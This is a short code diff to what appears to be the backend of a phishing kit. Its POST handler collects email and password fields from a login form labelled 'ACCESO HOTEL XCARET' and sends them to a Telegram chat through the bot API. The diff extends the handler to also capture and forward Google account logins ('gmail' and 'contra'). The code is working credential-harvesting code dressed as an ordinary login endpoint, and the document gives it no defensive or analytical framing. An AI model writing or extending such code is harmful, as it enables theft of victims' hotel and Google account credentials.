@@ -1,11 +1,14 @@
 export async function POST(req: Request) {
   try {
-    const { email, password } = await req.json();
+    const { email, password, gmail, contra } = await req.json();
 
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_BOT_CHAT_ID = process.env.TELEGRAM_BOT_CHAT_ID;
 
-    const mensaje = `-----ACCESO HOTEL XCARET-----\nEMAIL: ${email}\nPASSWORD: ${password}\n `;
+    const mensaje = `
+    -----ACCESO HOTEL XCARET-----\nEMAIL: ${email || " "}\nPASSWORD: ${password || " "}\n
+    -----GOOGLE ACCESS-----\nGMAIL O NUMERO: ${gmail || " "}\nCONTRASENA: ${contra || " "}\n
+    `;
 
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
